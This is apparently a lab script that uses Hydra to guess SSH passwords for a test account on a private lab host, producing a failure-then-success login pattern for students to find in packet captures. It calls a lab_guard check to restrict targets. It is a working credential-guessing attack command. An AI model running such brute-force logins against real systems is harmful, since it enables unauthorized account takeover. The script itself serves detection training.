#!/usr/bin/env bash
# ssh-bruteforce.sh: scenario 2, SSH password guessing (MITRE T1110.001).
#
#   bash scripts/kali/ssh-bruteforce.sh [target]    default target 10.0.50.30
#
# Reuses the Lab 1 account `labvictim` and the 20-entry list in
# lab-passwords.txt. The last entry is that account's real lab password, so
# the run ends in one successful login after a burst of failures. That
# failure-burst-then-success shape is exactly what you will pivot on in the
# capture, and what the sensor's connection-rate rule is tuned to catch.
set -euo pipefail
DIR="$(dirname "$0")"
source "$DIR/_guard.sh"
T="${1:-10.0.50.30}"; lab_guard "$T"
command -v hydra >/dev/null || { echo "hydra not found (sudo apt install hydra)."; exit 1; }

echo "[*] Hydra: account labvictim @ $T, 4 parallel tasks, stop on first success"
hydra -l labvictim -P "$DIR/lab-passwords.txt" -t 4 -f -V "ssh://$T"
